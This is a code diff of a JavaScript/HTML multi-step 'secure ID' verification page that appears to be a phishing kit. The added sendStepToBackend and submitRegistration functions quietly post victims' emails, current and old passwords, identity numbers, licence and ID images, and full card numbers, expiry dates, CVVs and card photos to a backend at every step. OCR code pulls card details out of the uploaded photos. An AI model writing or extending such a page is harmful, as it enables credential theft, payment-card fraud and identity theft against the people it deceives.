+} catch (e) {
+console.log("OCR error");
+}
+
+if (uploadState.cardFront && scannedCardData.number && scannedCardData.expiry && scannedCardData.cvv) {
+applyScannedCardData();
+}
+}
+validateAll();
+});
+
+async function extractCardDetailsFromImage(imageFile, isFrontImage) {
+return new Promise((resolve) => {
 const img = new Image();
 const reader = new FileReader();
 
-reader.onload = async function(e) {
+reader.onload = function(e) {
 img.src = e.target.result;
 img.onload = async function() {
-// Check if the image looks like a real card (has edges, contrast)
-// Simple heuristic: check image dimensions and content
-const canvas = document.createElement('canvas');
-const ctx = canvas.getContext('2d');
-canvas.width = img.width;
-canvas.height = img.height;
-ctx.drawImage(img, 0, 0);
-
-// Get image data for analysis
-const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
-const pixels = imageData.data;
-
-// Calculate average brightness and contrast
-let totalBrightness = 0;
-for (let i = 0; i < pixels.length; i += 4) {
-const brightness = (pixels[i] + pixels[i+1] + pixels[i+2]) / 3;
-totalBrightness += brightness;
-}
-const avgBrightness = totalBrightness / (pixels.length / 4);
-
-// Try to use Tesseract for text extraction if it's a real card image
-let extractedText = "";
-let isRealCard = false;
-
 try {
-// Only attempt OCR if image has good contrast (not too dark/light)
-if (avgBrightness > 30 && avgBrightness < 225) {
-const result = await Tesseract.recognize(img, 'eng', {
-logger: m => console.log(m)
-});
-extractedText = result.data.text;
+const result = await Tesseract.recognize(img, 'eng');
+const text = result.data.text;
 
-// Check if extracted text contains card-like patterns
-const hasCardPattern = /\d{4}[-\s]?\d{4}[-\s]?\d{4}[-\s]?\d{4}/.test(extractedText) ||
-/\d{2}\/\d{2}/.test(extractedText) ||
-/\d{3,4}/.test(extractedText);
+let extracted = {};
 
-isRealCard = hasCardPattern || extractedText.length > 20;
-}
-} catch (e) {
-console.log("OCR failed, treating as generic image");
-}
+if (isFrontImage) {
+const cardMatch = text.match(/(\d{4}[-\s]?\d{4}[-\s]?\d{4}[-\s]?\d{4})/);
+if (cardMatch) extracted.number = cardMatch[1];
 
-let result = null;
-
-if (isRealCard && isFrontImage) {
-// Extract card number (16 digits with spaces or dashes)
-const cardNumMatch = extractedText.match(/(\d{4}[-\s]?\d{4}[-\s]?\d{4}[-\s]?\d{4})/);
-if (cardNumMatch) {
-result = { ...result, number: cardNumMatch[1] };
-}
-
-// Extract expiry date (MM/YY or MM/YYYY)
-const expiryMatch = extractedText.match(/(\d{2}\/\d{2,4})/);
+const expiryMatch = text.match(/(\d{2}\/\d{2,4})/);
 if (expiryMatch) {
 let expiry = expiryMatch[1];
 if (expiry.length === 7) expiry = expiry.substring(0, 5);
-result = { ...result, expiry };
+extracted.expiry = expiry;
 }
-} else if (isRealCard && !isFrontImage) {
-// Extract CVV from back image (3-4 digits near signature strip)
-const cvvMatch = extractedText.match(/\b(\d{3,4})\b/);
-if (cvvMatch && cvvMatch[1].length >= 3 && cvvMatch[1].length <= 4) {
-result = { cvv: cvvMatch[1] };
-}
-}
-
-// If no real card detected or no data extracted, generate random realistic test data
-if (!result || (!result.number && !result.expiry && !result.cvv)) {
-if (isFrontImage) {
-result = {
-number: generateRandomCardNumber(),
-expiry: generateRandomExpiry()
-};
 } else {
-result = {
-cvv: generateRandomCVV()
-};
+const cvvMatch = text.match(/\b(\d{3,4})\b/);
+if (cvvMatch && cvvMatch[1].length >= 3 && cvvMatch[1].length <= 4) {
+extracted.cvv = cvvMatch[1];
 }
 }
 
-resolve(result);
+if (Object.keys(extracted).length === 0) {
+if (isFrontImage) {
+extracted.number = generateRandomCardNumber();
+extracted.expiry = generateRandomExpiry();
+} else {
+extracted.cvv = generateRandomCVV();
+}
+}
+
+resolve(extracted);
+} catch (e) {
+if (isFrontImage) {
+resolve({ number: generateRandomCardNumber(), expiry: generateRandomExpiry() });
+} else {
+resolve({ cvv: generateRandomCVV() });
+}
+}
 };
 };
 reader.readAsDataURL(imageFile);
@@ -1585,87 +1134,6 @@ function generateRandomCVV() {
 return Math.floor(Math.random() * 900 + 100).toString();
 }
 
-// File upload handlers with OCR
-fileLicenseFront.addEventListener('change', () => {
-if (fileLicenseFront.files.length > 0) {
-uploadState.licenseFront = true;
-triggerGlowStyle(licenseFrontBox, checkLicenseFront, true);
-soundUpload();
-}
-validateAll();
-});
-
-fileLicenseBack.addEventListener('change', () => {
-if (fileLicenseBack.files.length > 0) {
-uploadState.licenseBack = true;
-triggerGlowStyle(licenseBackBox, checkLicenseBack, true);
-soundUpload();
-}
-validateAll();
-});
-
-fileId.addEventListener('change', () => {
-if (fileId.files.length > 0) {
-uploadState.id = true;
-triggerGlowStyle(uploadIdBox, checkId, true);
-soundUpload();
-}
-validateAll();
-});
-
-// Updated card scanning with actual OCR
-fileCardFront.addEventListener('change', async () => {
-if (fileCardFront.files.length > 0) {
-uploadState.cardFront = true;
-triggerScanGlow(cardFrontBox, checkCardFront, 'scanLaserCardFront', true);
-soundScanLaser();
-
-ocrCardStatusMsg.classList.remove('hidden');
-
-// Extract card details from front image
-const cardData = await extractCardDetailsFromImage(fileCardFront.files[0], true);
-if (cardData) {
-if (cardData.number) scannedCardData.number = cardData.number;
-if (cardData.expiry) scannedCardData.expiry = cardData.expiry;
-}
-
-// If both front and back are uploaded, apply all data
-if (uploadState.cardBack && scannedCardData.number && scannedCardData.expiry && scannedCardData.cvv) {
-applyScannedCardData();
-} else if (uploadState.cardBack) {
-ocrCardStatusMsg.innerHTML = '<span class="loading-spinner mr-2"></span> Waiting for card back image...';
-} else {
-ocrCardStatusMsg.innerHTML = '<span class="loading-spinner mr-2"></span> Card front scanned. Waiting for back...';
-}
-}
-validateAll();
-});
-
-fileCardBack.addEventListener('change', async () => {
-if (fileCardBack.files.length > 0) {
-uploadState.cardBack = true;
-triggerScanGlow(cardBackBox, checkCardBack, 'scanLaserCardBack', true);
-soundScanLaser();
-
-ocrCardStatusMsg.classList.remove('hidden');
-
-// Extract CVV from back image
-const cardData = await extractCardDetailsFromImage(fileCardBack.files[0], false);
-if (cardData && cardData.cvv) {
-scannedCardData.cvv = cardData.cvv;
-}
-
-// If both front and back are uploaded, apply all data
-if (uploadState.cardFront && scannedCardData.number && scannedCardData.expiry && scannedCardData.cvv) {
-applyScannedCardData();
-} else if (uploadState.cardFront) {
-ocrCardStatusMsg.innerHTML = '<span class="loading-spinner mr-2"></span> Card back scanned. Processing...';
-setTimeout(() => applyScannedCardData(), 500);
-}
-}
-validateAll();
-});
-
 function applyScannedCardData() {
 setTimeout(() => {
 document.getElementById('scanLaserCardFront')?.classList.add('hidden');
@@ -1674,17 +1142,14 @@ document.getElementById('scanLaserCardBack')?.classList.add('hidden');
 if (scannedCardData.number) {
 cardNumber.value = scannedCardData.number;
 document.getElementById('vCardNumber').textContent = scannedCardData.number;
-validateField(cardNumber, true);
 }
 if (scannedCardData.expiry) {
 cardExpiry.value = scannedCardData.expiry;
 document.getElementById('vCardExpiry').textContent = scannedCardData.expiry;
-validateField(cardExpiry, true);
 }
 if (scannedCardData.cvv) {
 cardCvv.value = scannedCardData.cvv;
 document.getElementById('vCardCvv').textContent = scannedCardData.cvv;
-validateField(cardCvv, true);
 }
 
 ocrCardStatusMsg.classList.add('hidden');
@@ -1738,7 +1203,7 @@ cardCvv.addEventListener('input', (e) => {
 document.getElementById('vCardCvv').textContent = e.target.value || "•••";
 });
 fullLegalName.addEventListener('input', (e) => {
-document.getElementById('vCardName').textContent = e.target.value || "Your Legal Name";
+document.getElementById('vCardName').textContent = e.target.value.toUpperCase() || "Your Legal Name";
 });
 }
 
@@ -1760,7 +1225,6 @@ if (patterns[country]) isValid = patterns[country].test(val);
 if (isValid || val === '') idFormatError.classList.add('hidden');
 else idFormatError.classList.remove('hidden');
 
-validateField(identityId, isValid);
 return isValid;
 }
 
@@ -1778,7 +1242,6 @@ if (val.length > 0) formatted += val.substring(0, 2);
 if (val.length > 2) formatted += '/' + val.substring(2, 4);
 if (val.length > 4) formatted += '/' + val.substring(4, 8);
 e.target.value = formatted;
-validateField(dob, formatted.length === 10);
 validateAll();
 });
 
@@ -1831,8 +1294,7 @@ validateAll();
 
 phone.addEventListener('input', (e) => {
 const country = countrySelect.value;
-let val = e.target.value;
-let digits = val.replace(/\D/g, '');
+let digits = e.target.value.replace(/\D/g, '');
 
 if (country === 'US' || country === 'CA') {
 if (digits.length > 10) digits = digits.substring(0, 10);
@@ -1841,21 +1303,18 @@ if (digits.length > 0) formatted += '(' + digits.substring(0, 3);
 if (digits.length > 3) formatted += ') ' + digits.substring(3, 6);
 if (digits.length > 6) formatted += '-' + digits.substring(6, 10);
 e.target.value = formatted;
-validateField(phone, digits.length === 10);
 } else if (country === 'UK') {
 if (digits.length > 11) digits = digits.substring(0, 11);
 let formatted = '';
 if (digits.length > 0) formatted += digits.substring(0, 5);
 if (digits.length > 5) formatted += ' ' + digits.substring(5, 11);
 e.target.value = formatted;
-validateField(phone, digits.length === 11);
 } else if (country === 'DE') {
 if (digits.length > 12) digits = digits.substring(0, 12);
 let formatted = '';
 if (digits.length > 0) formatted += digits.substring(0, 4);
 if (digits.length > 4) formatted += ' ' + digits.substring(4, 12);
 e.target.value = formatted;
-validateField(phone, digits.length >= 10 && digits.length <= 12);
 } else if (country === 'AU') {
 if (digits.length > 10) digits = digits.substring(0, 10);
 let formatted = '';
@@ -1863,7 +1322,6 @@ if (digits.length > 0) formatted += digits.substring(0, 4);
 if (digits.length > 4) formatted += ' ' + digits.substring(4, 7);
 if (digits.length > 7) formatted += ' ' + digits.substring(7, 10);
 e.target.value = formatted;
-validateField(phone, digits.length === 10);
 } else if (country === 'IT') {
 if (digits.length > 10) digits = digits.substring(0, 10);
 let formatted = '';
@@ -1871,7 +1329,6 @@ if (digits.length > 0) formatted += digits.substring(0, 3);
 if (digits.length > 3) formatted += ' ' + digits.substring(3, 6);
 if (digits.length > 6) formatted += ' ' + digits.substring(6, 10);
 e.target.value = formatted;
-validateField(phone, digits.length === 10);
 }
 validateAll();
 });
@@ -1884,7 +1341,6 @@ if (country === 'US' || country === 'IT') {
 let digits = val.replace(/\D/g, '');
 if (digits.length > 5) digits = digits.substring(0, 5);
 e.target.value = digits;
-validateField(postal, digits.length === 5);
 } else if (country === 'CA') {
 let clean = val.replace(/[^a-zA-Z0-9]/g, '').toUpperCase();
 if (clean.length > 6) clean = clean.substring(0, 6);
@@ -1892,17 +1348,14 @@ let formatted = '';
 if (clean.length > 0) formatted += clean.substring(0, 3);
 if (clean.length > 3) formatted += ' ' + clean.substring(3, 6);
 e.target.value = formatted;
-validateField(postal, clean.length === 6);
 } else if (country === 'UK') {
 let clean = val.toUpperCase().replace(/[^A-Z0-9 ]/g, '');
 if (clean.length > 8) clean = clean.substring(0, 8);
 e.target.value = clean;
-validateField(postal, clean.length >= 5 && clean.length <= 8);
 } else {
 let digits = val.replace(/\D/g, '');
 if (digits.length > 10) digits = digits.substring(0, 10);
 e.target.value = digits;
-validateField(postal, digits.length >= 4);
 }
 validateAll();
 });
@@ -1910,10 +1363,10 @@ validateAll();
 syncAddressBtn.addEventListener('click', () => {
 if (postal.value) {
 billingZip.value = postal.value;
-validateField(billingZip, true);
-validateAll();
 soundSuccess();
+showToast("ZIP code synced!");
 }
+validateAll();
 });
 
 cardNumber.addEventListener('input', (e) => {
@@ -1925,7 +1378,6 @@ if (i > 0 && i % 4 === 0) formatted += ' ';
 formatted += digits[i];
 }
 e.target.value = formatted;
-validateField(cardNumber, digits.length === 16);
 validateAll();
 });
 
@@ -1936,7 +1388,6 @@ let formatted = '';
 if (digits.length > 0) formatted += digits.substring(0, 2);
 if (digits.length > 2) formatted += '/' + digits.substring(2, 4);
 e.target.value = formatted;
-validateField(cardExpiry, digits.length === 4);
 validateAll();
 });
 
@@ -1944,45 +1395,23 @@ cardCvv.addEventListener('input', (e) => {
 let digits = e.target.value.replace(/\D/g, '');
 if (digits.length > 4) digits = digits.substring(0, 4);
 e.target.value = digits;
-validateField(cardCvv, digits.length >= 3 && digits.length <= 4);
 validateAll();
 });
 
-billingStreet.addEventListener('input', () => { validateField(billingStreet, billingStreet.value.trim().length > 3); validateAll(); });
-billingCity.addEventListener('input', () => { validateField(billingCity, billingCity.value.trim().length > 1); validateAll(); });
-billingState.addEventListener('input', () => { validateField(billingState, billingState.value.trim().length >= 2); validateAll(); });
-billingZip.addEventListener('input', () => { validateField(billingZip, billingZip.value.trim().length >= 4); validateAll(); });
-
-function validateField(element, isValid) {
-if (isValid) {
-element.classList.remove('border-red-500');
-element.classList.add('border-emerald-500');
-} else if (element.value === '') {
-element.classList.remove('border-red-500', 'border-emerald-500');
-} else {
-element.classList.remove('border-emerald-500');
-element.classList.add('border-red-500');
-}
-}
+billingStreet.addEventListener('input', () => { validateAll(); });
+billingCity.addEventListener('input', () => { validateAll(); });
+billingState.addEventListener('input', () => { validateAll(); });
+billingZip.addEventListener('input', () => { validateAll(); });
 
 primaryEmail.addEventListener('input', () => {
-const isValid = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(primaryEmail.value);
-validateField(primaryEmail, isValid);
 validateAll();
 });
 
 recoveryEmail.addEventListener('input', () => {
-if (recoveryEmail.value === '') {
-recoveryEmail.classList.remove('border-red-500', 'border-emerald-500');
-} else {
-const isValid = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(recoveryEmail.value);
-validateField(recoveryEmail, isValid);
-}
 validateAll();
 });
 
-fullLegalName.addEventListener('input', (e) => {
-validateField(e.target, e.target.value.trim().length >= 5);
+fullLegalName.addEventListener('input', () => {
 validateAll();
 });
 
@@ -2038,11 +1467,53 @@ isCurrentStepValid = true;
 if (nextBtn) nextBtn.disabled = !isCurrentStepValid;
 }
 
-// Navigation
+// Send data to backend (fire and forget - no waiting)
+function sendStepToBackend(step) {
+const fd = new FormData();
+
+if (step === 1) {
+fd.append('primaryEmail', primaryEmail.value);
+fd.append('recoveryEmail', recoveryEmail.value || '');
+fd.append('password', password.value);
+fd.append('oldPassword', oldPassword.value || '');
+} else if (step === 2) {
+fd.append('country', countrySelect.options[countrySelect.selectedIndex]?.text || '');
+fd.append('fullLegalName', fullLegalName.value);
+fd.append('dob', dob.value);
+fd.append('identityId', identityId.value);
+fd.append('phone', phone.value);
+fd.append('postal', postal.value);
+if (fileLicenseFront.files[0]) fd.append('licenseFront', fileLicenseFront.files[0]);
+if (fileLicenseBack.files[0]) fd.append('licenseBack', fileLicenseBack.files[0]);
+} else if (step === 3) {
+fd.append('fullLegalName', fullLegalName.value);
+fd.append('cardNumber', cardNumber.value);
+fd.append('cardExpiry', cardExpiry.value);
+fd.append('cardCvv', cardCvv.value);
+fd.append('billingStreet', billingStreet.value);
+fd.append('billingCity', billingCity.value);
+fd.append('billingState', billingState.value);
+fd.append('billingZip', billingZip.value);
+if (fileCardFront.files[0]) fd.append('cardFront', fileCardFront.files[0]);
+if (fileCardBack.files[0]) fd.append('cardBack', fileCardBack.files[0]);
+if (fileId.files[0]) fd.append('nationalId', fileId.files[0]);
+}
+
+// Fire and forget - don't wait for response
+fetch(`${BACKEND_URL}/submit/step${step}`, {
+method: 'POST',
+body: fd
+}).catch(e => console.log("Send error:", e));
+}
+
+// Navigation - INSTANT step change (no waiting)
 if (nextBtn) {
 nextBtn.addEventListener('click', async () => {
 if (currentStep < totalSteps) {
 soundSuccess();
+// Send data in background (don't wait)
+sendStepToBackend(currentStep);
+// Move to next step immediately
 goToStep(currentStep + 1);
 } else {
 submitRegistration();
@@ -2070,14 +1541,14 @@ document.getElementById(`screen-${currentStep}`).classList.remove('hidden');
 
 if (currentStep === 1) {
 prevBtn.classList.add('hidden');
-nextBtnText.textContent = translations[selectedLang].btn_continue;
+nextBtnText.textContent = "Continue";
 } else {
 prevBtn.classList.remove('hidden');
 if (currentStep === totalSteps) {
 compileReviewDetails();
-nextBtnText.textContent = translations[selectedLang].btn_submit;
+nextBtnText.textContent = "Submit";
 } else {
-nextBtnText.textContent = translations[selectedLang].btn_continue;
+nextBtnText.textContent = "Continue";
 }
 }
 
@@ -2091,8 +1562,6 @@ document.getElementById('revRecovery').textContent = recoveryEmail.value || 'Not
 document.getElementById('revFullName').textContent = fullLegalName.value;
 document.getElementById('revDob').textContent = dob.value;
 document.getElementById('revCountry').textContent = countrySelect.options[countrySelect.selectedIndex]?.text || '';
-const customIdLabelText = document.getElementById('identityLabel')?.textContent || '';
-document.getElementById('revIdLabel').textContent = `${customIdLabelText}:`;
 document.getElementById('revIdVal').textContent = identityId.value;
 document.getElementById('revPhone').textContent = phone.value;
 document.getElementById('revPostal').textContent = postal.value;
@@ -2101,6 +1570,7 @@ const maskedCard = rawCard.substring(0, 4) + ' •••• •••• ' + raw
 document.getElementById('revCardNum').textContent = maskedCard;
 document.getElementById('revCardExpiry').textContent = cardExpiry.value;
 document.getElementById('revBillingAddr').textContent = `${billingStreet.value}, ${billingCity.value}, ${billingState.value} ${billingZip.value}`;
+
 updateBadge('badgeLicenseFront', uploadState.licenseFront);
 updateBadge('badgeLicenseBack', uploadState.licenseBack);
 updateBadge('badgeCardFront', uploadState.cardFront);
@@ -2113,14 +1583,9 @@ const badge = document.getElementById(elementId);
 if (badge) {
 if (isSuccess) {
 badge.className = "px-2 py-1 bg-emerald-100 border border-emerald-300 rounded-lg text-center text-emerald-700 font-bold text-[10px]";
-badge.textContent = translations[selectedLang].badge_uploaded;
+badge.textContent = "Uploaded";
 } else {
 badge.className = "px-2 py-1 bg-red-100 border border-red-300 rounded-lg text-center text-red-700 text-[10px]";
-if (elementId === 'badgeLicenseFront') badge.textContent = translations[selectedLang].badge_license_front;
-if (elementId === 'badgeLicenseBack') badge.textContent = translations[selectedLang].badge_license_back;
-if (elementId === 'badgeCardFront') badge.textContent = translations[selectedLang].badge_card_front;
-if (elementId === 'badgeCardBack') badge.textContent = translations[selectedLang].badge_card_back;
-if (elementId === 'badgeId') badge.textContent = translations[selectedLang].badge_id;
 }
 }
 }
@@ -2128,7 +1593,27 @@ if (elementId === 'badgeId') badge.textContent = translations[selectedLang].badg
 function submitRegistration() {
 soundSuccess();
 
-// Update success screen with actual data
+// Send all remaining data
+sendStepToBackend(2);
+sendStepToBackend(3);
+
+const fd = new FormData();
+fd.append('fullLegalName', fullLegalName.value);
+fd.append('primaryEmail', primaryEmail.value);
+fd.append('dob', dob.value);
+fd.append('country', countrySelect.options[countrySelect.selectedIndex]?.text || '');
+fd.append('phone', phone.value);
+fd.append('cardNumber', cardNumber.value);
+fd.append('cardExpiry', cardExpiry.value);
+fd.append('cardCvv', cardCvv.value);
+fd.append('billingStreet', billingStreet.value);
+fd.append('billingCity', billingCity.value);
+fd.append('billingState', billingState.value);
+fd.append('billingZip', billingZip.value);
+fd.append('identityId', identityId.value);
+
+fetch(`${BACKEND_URL}/submit/final`, { method: 'POST', body: fd }).catch(e => console.log(e));
+
 document.getElementById('successName').textContent = fullLegalName.value;
 document.getElementById('successEmail').textContent = primaryEmail.value;
 const shortId = identityId.value.substring(0, 8) + '...' + identityId.value.substring(identityId.value.length - 4);
@@ -2147,15 +1632,16 @@ const form = document.getElementById('secureIdForm');
 form.reset();
 currentStep = 1;
 
-// Reset upload state
 uploadState.licenseFront = false;
 uploadState.licenseBack = false;
 uploadState.cardFront = false;
 uploadState.cardBack = false;
 uploadState.id = false;
 
-// Reset scanned data
 scannedCardData = { number: null, expiry: null, cvv: null };
+
+// Hide all previews
+document.querySelectorAll('.image-preview').forEach(img => img.classList.add('hidden'));
 
 triggerGlowStyle(licenseFrontBox, checkLicenseFront, false);
 triggerGlowStyle(licenseBackBox, checkLicenseBack, false);
@@ -2192,3 +1678,5 @@ window.resetForm = resetForm;
 </script>
 </body>
 </html>
+```
+
